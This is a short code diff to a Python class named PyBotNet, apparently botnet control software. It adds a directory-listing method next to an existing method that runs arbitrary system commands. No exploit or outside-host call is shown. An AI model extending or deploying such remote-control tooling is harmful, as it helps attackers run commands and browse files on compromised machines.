@@ -114,3 +114,7 @@ class PyBotNet:
     def run_command_in_system(self, command: str) -> str:
         '''run system command in console and return data'''
         return scripts.execute_cmd('None '+command, self.logger)
+
+    def run_ls(self, route: str) -> str:
+        '''return list of directory or files'''
+        return scripts.ls(route)
